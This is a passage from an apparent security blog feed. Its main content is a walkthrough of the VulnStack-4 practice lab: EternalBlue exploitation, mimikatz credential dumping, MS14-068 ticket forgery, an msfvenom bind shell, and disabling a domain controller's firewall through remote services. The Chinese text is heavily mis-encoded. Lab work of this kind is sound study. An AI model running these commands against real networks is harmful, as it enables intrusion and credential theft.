data-language="shell"><code class="language-shell">use auxiliary/scanner/smb/smb_ms17_010 <span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.183.128-130run</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704223127961.png" alt loading="lazy"></p><p>å…ˆæ‰“Windows7è¿™å°</p><p>æˆ‘ä»¬ä½¿ç”¨<code>chisel</code>ä»£ç†å·¥å…·æ¥è¿›è¡Œå†…ç½‘æ¸—é€è¿æ¥ï¼Œä¸‹è½½é“¾æ¥ï¼š<a href="https://github.com/jpillora/chiselï¼Œå…·ä½“ä½¿ç”¨æ–¹æ³•å¯ä»¥çœ‹ï¼šhttps://www.anquanke.com/post/id/234771ï¼Œä¸ºä»€ä¹ˆä¸ç”¨åŸæ¥çš„ewï¼Œå› ä¸ºç”¨ewä¸ç¨³å®šï¼Œ`ms17_011`æ‰“ä¸é€šï¼ˆæœ¬äººäº²æµ‹æ‰“ä¸é€šï¼‰">https://github.com/jpillora/chiselï¼Œå…·ä½“ä½¿ç”¨æ–¹æ³•å¯ä»¥çœ‹ï¼šhttps://www.anquanke.com/post/id/234771ï¼Œä¸ºä»€ä¹ˆä¸ç”¨åŸæ¥çš„ewï¼Œå› ä¸ºç”¨ewä¸ç¨³å®šï¼Œ`ms17_011`æ‰“ä¸é€šï¼ˆæœ¬äººäº²æµ‹æ‰“ä¸é€šï¼‰</a></p><p>Ubuntuä¸Šæ‰§è¡Œ<code>./chisel server -p 2333 --socks5</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705103219718.png" alt loading="lazy"></p><p>Kaliæœºä¸Šè¿›è¡Œè¿æ¥<code>./chisel client 192.168.0.107:2333 1080:socks</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705103303270.png" alt loading="lazy"></p><p>åå‘ä»£ç†ï¼Œè¿™æ ·æˆ‘ä»¬kaliæœºä¸Šçš„1080ç«¯å£å°±å¯ä»¥è®¿é—®å†…ç½‘é‡Œçš„ä¸»æœºäº†</p><p>ç„¶åç”¨msfæ‰“</p><pre class="language-shell" data-language="shell"><code class="language-shell">setg Proxies socks5:127.0.0.1:1080       // è®¾ç½®ä»£ç†ï¼Œä¸è®¾ç½®ä»£ç†ms17_010å¾ˆéš¾æ‰“é€šuse exploit/windows/smb/ms17_010_eternalblue<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/bind_tcp<span class="token builtin class-name">set</span> RHOST <span class="token number">192.168</span>.183.129<span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.0.106<span class="token builtin class-name">set</span> lport <span class="token number">4444</span><span class="token builtin class-name">set</span> AutoRunScript post/windows/manage/migrate             // è‡ªåŠ¨è¿ç§»è¿›ç¨‹run</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705103725565.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705103739255.png" alt loading="lazy"></p><p>ä¸€æ¬¡æ‰“é€š</p><h4 id="å†…ç½‘ä¿¡æ¯æœé›†"><a href="#å†…ç½‘ä¿¡æ¯æœé›†" class="headerlink" title="å†…ç½‘ä¿¡æ¯æœé›†"></a>å†…ç½‘ä¿¡æ¯æœé›†</h4><pre class="language-shell" data-language="shell"><code class="language-shell">sysinfo                <span class="token comment">#æŸ¥çœ‹ä¸»æœºä¿¡æ¯</span>getuid                 <span class="token comment">#æŸ¥çœ‹å½“å‰token</span>use incognito          <span class="token comment">#åŠ è½½incognitoï¼Œï¼ˆç”¨æ¥ç›—çªƒç›®æ ‡ä¸»æœºçš„ä»¤ç‰Œæˆ–æ˜¯å‡å†’ç”¨æˆ·)</span>list_tokens -u         <span class="token comment">#åˆ—å‡ºç›®æ ‡ä¸»æœºç”¨æˆ·çš„å¯ç”¨ä»¤ç‰Œ</span>impersonate_token <span class="token string">"DEMO\douser"</span> <span class="token comment">#æ¨¡æ‹ŸDEMO\douserç”¨æˆ·</span>rev2self               <span class="token comment">#è¿”å›åˆ°ä¹‹å‰çš„AccessTokenæƒé™</span></code></pre><pre class="language-shell" data-language="shell"><code class="language-shell">execute -f cmd.exe -i       <span class="token comment"># äº¤äº’å¼è¿è¡Œcmd</span>execute -f cmd.exe -i -t    <span class="token comment"># ä½¿ç”¨å¯ç”¨token è¿è¡Œ</span>execute -f cmd.exe -i -H -t <span class="token comment"># åŒä¸Šï¼ŒåŒæ—¶éšè—è¿›ç¨‹</span><span class="token comment"># å¯ä»¥ç›´æ¥shell</span>chcp <span class="token number">65001</span>      <span class="token comment"># ç®€å•è§£å†³ä¸€ä¸‹ä¹±ç </span>ipconfig /all   <span class="token comment"># æŸ¥çœ‹æœ¬æœºipï¼Œæ‰€åœ¨åŸŸ</span>route print     <span class="token comment"># æ‰“å°è·¯ç”±ä¿¡æ¯</span>net view        <span class="token comment"># æŸ¥çœ‹å±€åŸŸç½‘å†…å…¶ä»–ä¸»æœºå</span>arp -a          <span class="token comment"># æŸ¥çœ‹arpç¼“å­˜</span><span class="token function">whoami</span>net start       <span class="token comment"># æŸ¥çœ‹å¼€å¯äº†å“ªäº›æœåŠ¡</span>net share       <span class="token comment"># æŸ¥çœ‹å¼€å¯äº†å“ªäº›å…±äº«</span>net share ipc$  <span class="token comment"># å¼€å¯ipcå…±äº«</span>net share c$    <span class="token comment"># å¼€å¯cç›˜å…±äº«</span>net use <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.xx.xx<span class="token punctuation">\</span>ipc$ <span class="token string">""</span> /user:<span class="token string">""</span>   <span class="token comment"># ä¸192.168.xx.xxå»ºç«‹ç©ºè¿æ¥</span>net use <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.xx.xx<span class="token punctuation">\</span>c$ <span class="token string">"å¯†ç "</span> /user:<span class="token string">"ç”¨æˆ·å"</span>  <span class="token comment"># å»ºç«‹cç›˜å…±äº«</span><span class="token function">dir</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.xx.xx<span class="token punctuation">\</span>c$<span class="token punctuation">\</span>user    <span class="token comment"># æŸ¥çœ‹192.168.xx.xx cç›˜userç›®å½•ä¸‹çš„æ–‡ä»¶</span><span class="token comment"># ä»¥ä¸‹å‘½ä»¤éœ€è¦åˆ‡æ¢åˆ°åŸŸç”¨æˆ·douseræ‰§è¡Œ</span>net config Workstation   <span class="token comment"># æŸ¥çœ‹è®¡ç®—æœºåã€å…¨åã€ç”¨æˆ·åã€ç³»ç»Ÿç‰ˆæœ¬ã€å·¥ä½œç«™ã€åŸŸã€ç™»å½•åŸŸ</span>net user                 <span class="token comment"># æŸ¥çœ‹æœ¬æœºç”¨æˆ·åˆ—è¡¨</span>net user /domain         <span class="token comment"># æŸ¥çœ‹åŸŸç”¨æˆ·</span>net localgroup administrators   <span class="token comment"># æŸ¥çœ‹æœ¬åœ°ç®¡ç†å‘˜ç»„ï¼ˆé€šå¸¸ä¼šæœ‰åŸŸç”¨æˆ·ï¼‰</span>net view /domain         <span class="token comment"># æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸ</span>net user ç”¨æˆ·å /domain   <span class="token comment"># è·å–æŒ‡å®šåŸŸç”¨æˆ·çš„ä¿¡æ¯</span>net group /domain        <span class="token comment"># æŸ¥çœ‹åŸŸé‡Œé¢çš„å·¥ä½œç»„ï¼ŒæŸ¥çœ‹æŠŠç”¨æˆ·åˆ†äº†å¤šå°‘ç»„ï¼ˆåªèƒ½åœ¨åŸŸæ§ä¸Šæ“ä½œï¼‰</span>net group ç»„å /domain    <span class="token comment"># æŸ¥çœ‹åŸŸä¸­æŸå·¥ä½œç»„</span>net group <span class="token string">"domain admins"</span> /domain  <span class="token comment"># æŸ¥çœ‹åŸŸç®¡ç†å‘˜çš„åå­—</span>net group <span class="token string">"domain computers"</span> /domain  <span class="token comment"># æŸ¥çœ‹åŸŸä¸­çš„å…¶ä»–ä¸»æœºå</span>net group <span class="token string">"doamin controllers"</span> /domain  <span class="token comment"># æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ï¼ˆå¯èƒ½æœ‰å¤šå°ï¼‰</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705110427222.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705112759516.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705112650145.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705112722114.png" alt loading="lazy"></p><p>ç”±æœé›†åˆ°çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬çŸ¥é“ç›®æ ‡win7åœ¨demo.comåŸŸä¸­ï¼ŒåŸŸæ§ä¸º<code>WIN-ENS2VR5TR3N</code>ï¼ŒåŸŸç®¡ç†å‘˜ä¸º<code>Administrator</code>ï¼Œ<code>ping</code>æŸ¥çœ‹åŸŸæ§<code>ip</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705113022472.png" alt loading="lazy"></p><p>åœ¨ç›®æ ‡æœºä¸Šä¼ mimikatzï¼ŒæŠ“ä¸€ä¸‹Windows 7çš„å¯†ç ï¼Œæ³¨æ„è¦å…ˆæ¨¡æ‹Ÿä¸ªsystemçš„ä»¤ç‰Œæ‰èƒ½æ‰§è¡ŒæˆåŠŸ</p><pre class="language-shell" data-language="shell"><code class="language-shell">impersonate_token <span class="token string">"NT AUTHORITY\SYSTEM"</span>shellmimikatz.exeprivilege::debugsekurlsa::logonpasswords</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705122131380.png" alt loading="lazy"></p><p>å¾—åˆ°æ˜æ–‡å¯†ç ä¸º<code>Dotest123</code>ï¼Œæ¥ä¸‹æ¥å¯ä»¥è¿›è¡Œæ¨ªå‘ç§»åŠ¨æ”»å‡»åŸŸæ§</p><h4 id="ms14-068åˆ©ç”¨"><a href="#ms14-068åˆ©ç”¨" class="headerlink" title="ms14-068åˆ©ç”¨"></a>ms14-068åˆ©ç”¨</h4><p>æ¼æ´åˆ©ç”¨å‰æ</p><ol><li>åŸŸæ§æ²¡æœ‰æ‰“MS14-068çš„è¡¥ä¸(KB3011780)</li><li>æ‹¿ä¸‹ä¸€å°åŠ å…¥åŸŸçš„è®¡ç®—æœº</li><li>æœ‰è¿™å°åŸŸå†…è®¡ç®—æœºçš„åŸŸç”¨æˆ·å¯†ç å’ŒSid</li></ol><p>å°è¯•ç”¨<code>ms17_010</code>æ‰“åŸŸæ§æœº</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705133417461.png" alt loading="lazy"></p><p>åˆ©ç”¨å¤±è´¥</p><p>ä½¿ç”¨ms14-068ï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p><pre class="language-shell" data-language="shell"><code class="language-shell">upload /home/kali/Desktop/WindowsExploits/MS14-068/MS14-068.exe c:<span class="token punctuation">\</span><span class="token punctuation">\</span>users<span class="token punctuation">\</span><span class="token punctuation">\</span>douser</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705134119462.png" alt loading="lazy"></p><p>åœ¨win7ä¸Šæ‰§è¡Œä¸‹é¢ä¸€æ¡å‘½ä»¤<br>åŸŸæˆå‘˜<code>sid</code>åœ¨ä¸Šé¢<code>mimikatz</code>ä¸­è·å–åˆ°äº†</p><pre class="language-shell" data-language="shell"><code class="language-shell">ms14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d <span class="token number">192.168</span>.183.130 -p Dotest123// ms14-068.exe -u åŸŸæˆå‘˜å@åŸŸå.com -s åŸŸæˆå‘˜sid -d åŸŸæ§åˆ¶å™¨ipåœ°å€ -p åŸŸæˆå‘˜å¯†ç </code></pre><p>æˆåŠŸç”Ÿæˆç¥¨æ®æ–‡ä»¶</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705134511406.png" alt loading="lazy"></p><pre class="language-shell" data-language="shell"><code class="language-shell">c:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>mimikatz.exekerberos::purge               <span class="token comment"># æ¸…ç©ºå½“å‰æœºå™¨ä¸­æ‰€æœ‰å‡­è¯ï¼Œå¦‚æœæœ‰åŸŸæˆå‘˜å‡­è¯ä¼šå½±å“å‡­è¯ä¼ªé€ </span>kerberos::list                <span class="token comment"># æŸ¥çœ‹å½“å‰æœºå™¨å‡­è¯</span>kerberos::ptc TGT_douser@DEMO.com.ccache<span class="token punctuation">(</span>ç”Ÿæˆçš„ç¥¨æ®æ–‡ä»¶<span class="token punctuation">)</span>   <span class="token comment"># å°†ç¥¨æ®æ³¨å…¥åˆ°å†…å­˜ä¸­</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705134918464.png" alt loading="lazy"></p><p>å°è¯•<code>net use</code>ç™»å½•åŸŸæ§</p><pre class="language-shell" data-language="shell"><code class="language-shell">net use <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N<span class="token function">dir</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N<span class="token punctuation">\</span>c$</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705135037745.png" alt loading="lazy"></p><p>å¦‚ä¸Šå›¾ï¼ŒæˆåŠŸç™»å½•åŸŸæ§å¹¶åˆ—å‡ºäº†åŸŸæ§çš„cç›˜ç›®å½•ã€‚æ­¤æ—¶è¦æƒ³æ§åˆ¶åŸŸæ§æˆ‘ä»¬è¿˜è¦åœ¨Windows 7ä¸Šé¢ä¸Šä¼ ä¸€ä¸ª<strong>æ­£å‘</strong>çš„msfé©¬ã€‚</p><pre class="language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows/meterpreter/bind_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.0.108 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">4444</span> -f exe -o bind.exe</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705135301027.png" alt loading="lazy"></p><p>ä¼ åˆ°Windows7ä¸Šï¼Œç„¶åç”¨smbæ–‡ä»¶å…±äº«å°†msfé©¬copyåˆ°åŸŸæ§çš„Cç›˜</p><pre class="language-shell" data-language="shell"><code class="language-shell">upload /home/kali/Desktop/bind.exe</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705135451397.png" alt loading="lazy"></p><p>é€šè¿‡è¿œç¨‹åœ¨åŸŸæ§ä¸Šé¢è®¾ç½®å¥½è®¡åˆ’ä»»åŠ¡</p><pre class="language-shell" data-language="shell"><code class="language-shell">schtasks /create /tn <span class="token string">"test"</span> /tr C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>bind.exe /sc MINUTE /S <span class="token number">192.168</span>.183.130</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705135730932.png" alt loading="lazy"></p><p>æ˜¾ç¤º<code>Access is denied</code>ï¼Œç”¨scæœåŠ¡æ¥è¿œç¨‹æ‰§è¡Œï¼Œè®¾ç½®æœåŠ¡æ¥å…³é—­é˜²ç«å¢™</p><pre class="language-shell" data-language="shell"><code class="language-shell">sc <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N create unablefirewall <span class="token assign-left variable">binpath</span><span class="token operator">=</span> <span class="token string">"netsh advfirewall set allprofiles state off"</span>sc <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N start unablefirewall</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705140010708.png" alt loading="lazy"></p><p>åˆ›å»ºæœåŠ¡æ‰§è¡Œmsfé©¬ï¼ˆmsfæ­£åœ¨ç›‘å¬ï¼‰</p><pre class="language-shell" data-language="shell"><code class="language-shell">sc <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N create bindshell <span class="token assign-left variable">binpath</span><span class="token operator">=</span> <span class="token string">"c:<span class="token entity" title="\b">\b</span>ind.exe"</span>sc <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N start bindshell</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705140424925.png" alt loading="lazy"></p><p>msfé…ç½®</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705140300413.png" alt loading="lazy"></p><p>æˆåŠŸä¸Šçº¿åŸŸæ§</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705140509486.png" alt loading="lazy"></p><p>ä¸Šä¼ mimikatzæŠ“æ˜æ–‡å¯†ç </p><pre class="language-shell" data-language="shell"><code class="language-shell">upload /home/kali/Desktop/mimikatz.exe shellmimikatz.exeprivilege::debugsekurlsa::logonpasswords</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705141108130.png" alt loading="lazy"></p><p>æ‹¿åˆ°åŸŸç®¡ç†å‘˜å¯†ç ä¸º<code>Test2008@!</code></p><h3 id="å¯»æ‰¾æ•æ„Ÿæ–‡ä»¶"><a href="#å¯»æ‰¾æ•æ„Ÿæ–‡ä»¶" class="headerlink" title="å¯»æ‰¾æ•æ„Ÿæ–‡ä»¶"></a>å¯»æ‰¾æ•æ„Ÿæ–‡ä»¶</h3><p>æ‹¿ä¸‹åŸŸæ§åï¼Œæˆ‘ä»¬å°±è¦å¯»æ‰¾å¼€å¤´è¯´çš„é‚£ä¸ªåŸŸæ§ä¸­çš„é‡è¦æ–‡ä»¶äº†ã€‚å¼€å¯åŸŸæ§çš„è¿œç¨‹æ¡Œé¢</p><pre class="language-shell" data-language="shell"><code class="language-shell">run post/windows/manage/enable_rdp</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705141301815.png" alt loading="lazy"></p><p>ç™»å½•</p><pre class="language-shell" data-language="shell"><code class="language-shell">proxychains4 rdesktop <span class="token number">192.168</span>.183.130è¾“å…¥è´¦å·å¯†ç ï¼Œè´¦å·ï¼šDEMO<span class="token punctuation">\</span>Administrator å¯†ç ï¼šTest2008@<span class="token operator">!</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706103344426.png" alt loading="lazy"></p><p>ä¼ ä¸ªeverything</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706103708452.png" alt loading="lazy"></p><p>å®‰è£…åå¼€å¯é‡Œé¢çš„httpæœåŠ¡</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706104015740.png" alt loading="lazy"></p><p>kaliæµè§ˆå™¨èµ°ä¸ªä»£ç†ï¼Œsocks5çš„</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706105033678.png" alt loading="lazy"></p><p>éšåå³å¯è®¿é—®æœåŠ¡å™¨ä¸Šçš„æ‰€æœ‰æ–‡ä»¶</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706105540208.png" alt loading="lazy"></p><p>è‡³äºå•¥æ¼‚äº®å›½æ”»å‡»æˆæƒæŠ¥å‘Šï¼Œé¶æœºä¸Šæ²¡æœ‰è¿™æ–‡ä»¶ï¼Œä¼°è®¡æ˜¯è‡ªå·±åŠ ä¸Šå»çš„ï¼Œä½†ç›®çš„å·²è¾¾æˆï¼Œå¼€æºœ~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ¬æ–‡å…¨ç¨‹å‚è€ƒ &lt;a href=&quot;https://www.freebuf.com/articles/network/244704.html&quot;&gt;è®°ä¸€æ¬¡Vulnstacké¶åœºå†…ç½‘æ¸—é€ï¼ˆäºŒï¼‰&lt;/a&gt; æ¥å¤ç°æ¸—é€è¿‡ç¨‹ï¼Œç›®çš„åœ¨äºå­¦ä¹ æ¸—é€æµç¨‹å’ŒåŸºæœ¬æ€è·¯ï¼Œè®°å½•ä¸‹å­¦ä¹ ç¬”è®°&lt;/p&gt;
    
    </summary>
    
    
      <category term="æ¸—é€" scheme="https://www.extrader.top/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="é¶æœº" scheme="https://www.extrader.top/tags/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="å†…ç½‘" scheme="https://www.extrader.top/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>JavaScriptåŸå‹é“¾æ±¡æŸ“æ¼æ´å­¦ä¹ </title>
    <link href="https://www.extrader.top/posts/45af3b18/"/>
    <id>https://www.extrader.top/posts/45af3b18/</id>
    <published>2021-06-05T09:17:35.000Z</published>
    <updated>2021-06-05T12:18:31.876Z</updated>
    
    <content type="html"><![CDATA[<p>å­¦ç‚¹æ–°ä¸œè¥¿ï¼ŒJavaScriptç‹¬æœ‰çš„å®‰å…¨é—®é¢˜ï¼ŒJavaScriptåŸå‹é“¾æ±¡æŸ“ï¼Œè®°ç¬”è®°</p><span id="more"></span><h3 id="åŸå‹é“¾"><a href="#åŸå‹é“¾" class="headerlink" title="åŸå‹é“¾"></a>åŸå‹é“¾</h3><p>æ¬å¼ å›¾ï¼Œè½¬è‡ªï¼š<a href="https://www.zhihu.com/question/34183746">https://www.zhihu.com/question/34183746</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210605172359234.png" alt loading="lazy"></p><p>JavaScript åªæœ‰ä¸€ç§ç»“æ„ï¼šå¯¹è±¡ã€‚æ¯ä¸ªå®ä¾‹å¯¹è±¡ï¼ˆ object ï¼‰éƒ½æœ‰ä¸€ä¸ªç§æœ‰å±æ€§ï¼ˆç§°ä¹‹ä¸º <code>__proto__</code> ï¼‰æŒ‡å‘å®ƒçš„æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ï¼ˆ<code>prototype</code> ï¼‰ã€‚è¯¥åŸå‹å¯¹è±¡ä¹Ÿæœ‰ä¸€ä¸ªè‡ªå·±çš„åŸå‹å¯¹è±¡( <code>__proto__</code> ) ï¼Œå±‚å±‚å‘ä¸Šç›´åˆ°ä¸€ä¸ªå¯¹è±¡çš„åŸå‹å¯¹è±¡ä¸º <code>null</code>ã€‚æ ¹æ®å®šä¹‰ï¼Œ<code>null</code> æ²¡æœ‰åŸå‹ï¼Œå¹¶ä½œä¸ºè¿™ä¸ª<strong>åŸå‹é“¾</strong>ä¸­çš„æœ€åä¸€ä¸ªç¯èŠ‚ã€‚</p><p>æ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰<code>prototype</code>ä¸­çš„å±æ€§å’Œæ–¹æ³•ï¼Œè¿™ä¸ªç‰¹æ€§è¢«ç”¨æ¥å®ç°JavaScriptä¸­çš„ç»§æ‰¿æœºåˆ¶ã€‚</p><ul><li>åŸå‹ï¼šåŸå‹æ˜¯Javascriptä¸­ç»§æ‰¿çš„åŸºç¡€,Javascriptçš„ç»§æ‰¿å°±æ˜¯åŸºäºåŸå‹çš„ç»§æ‰¿</li><li>åŸå‹é“¾ï¼šåŸå‹é“¾æ˜¯javascriptçš„å®ç°çš„å½¢å¼,é€’å½’ç»§æ‰¿åŸå‹å¯¹è±¡çš„åŸå‹,åŸå‹é“¾çš„é¡¶ç«¯æ˜¯Objectçš„åŸå‹ã€‚</li></ul><h4 id="proto"><a href="#proto" class="headerlink" title="__proto__"></a>__proto__</h4><p>æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ <code>__proto__</code> å±æ€§ï¼ŒæŒ‡å‘äº†åˆ›å»ºè¯¥å¯¹è±¡çš„æ„é€ å‡½æ•°çš„åŸå‹ã€‚å…¶å®è¿™ä¸ªå±æ€§æŒ‡å‘äº† <code>[[prototype]]</code>ï¼Œä½†æ˜¯ <code>[[prototype]]</code> æ˜¯å†…éƒ¨å±æ€§ï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½è®¿é—®åˆ°ï¼Œæ‰€ä»¥ä½¿ç”¨ <code>__proto__</code> æ¥è®¿é—®ã€‚</p><h4 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a>prototype</h4><p>æ¯ä¸ªå‡½æ•°éƒ½æœ‰ prototype å±æ€§ï¼Œé™¤äº† <code>Function.prototype.bind()</code>ï¼Œè¯¥å±æ€§æŒ‡å‘åŸå‹ã€‚æ‰€æœ‰çš„ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰<code>prototype</code>ä¸­çš„å±æ€§å’Œæ–¹æ³•</p><blockquote><p>éµå¾ªECMAScriptæ ‡å‡†ï¼Œ<code>someObject.[[Prototype]]</code> ç¬¦å·æ˜¯ç”¨äºæŒ‡å‘ <code>someObject</code> çš„åŸå‹ã€‚ä» ECMAScript 6 å¼€å§‹ï¼Œ<code>[[Prototype]]</code> å¯ä»¥é€šè¿‡ <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/GetPrototypeOf"><code>Object.getPrototypeOf()</code></a> å’Œ <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/setPrototypeOf"><code>Object.setPrototypeOf()</code></a> è®¿é—®å™¨æ¥è®¿é—®ã€‚è¿™ä¸ªç­‰åŒäº JavaScript çš„éæ ‡å‡†ä½†è®¸å¤šæµè§ˆå™¨å®ç°çš„å±æ€§ <code>__proto__</code>ã€‚</p><p>ä½†å®ƒä¸åº”è¯¥ä¸æ„é€ å‡½æ•° <code>func</code> çš„ <code>prototype</code> å±æ€§ç›¸æ··æ·†ã€‚è¢«æ„é€ å‡½æ•°åˆ›å»ºçš„å®ä¾‹å¯¹è±¡çš„ <code>[[Prototype]]</code> æŒ‡å‘ <code>func</code> çš„ <code>prototype</code> å±æ€§ã€‚<strong><code>Object.prototype</code></strong> å±æ€§è¡¨ç¤º <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object"><code>Object</code></a> çš„åŸå‹å¯¹è±¡ã€‚</p></blockquote><h3 id="åŸå‹é“¾ç»§æ‰¿"><a href="#åŸå‹é“¾ç»§æ‰¿" class="headerlink" title="åŸå‹é“¾ç»§æ‰¿"></a>åŸå‹é“¾ç»§æ‰¿</h3><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// è®©æˆ‘ä»¬ä»ä¸€ä¸ªå‡½æ•°é‡Œåˆ›å»ºä¸€ä¸ªå¯¹è±¡oï¼Œå®ƒè‡ªèº«æ‹¥æœ‰å±æ€§aå’Œbçš„ï¼š</span><span class="token keyword">let</span> <span class="token function-variable function">f</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token 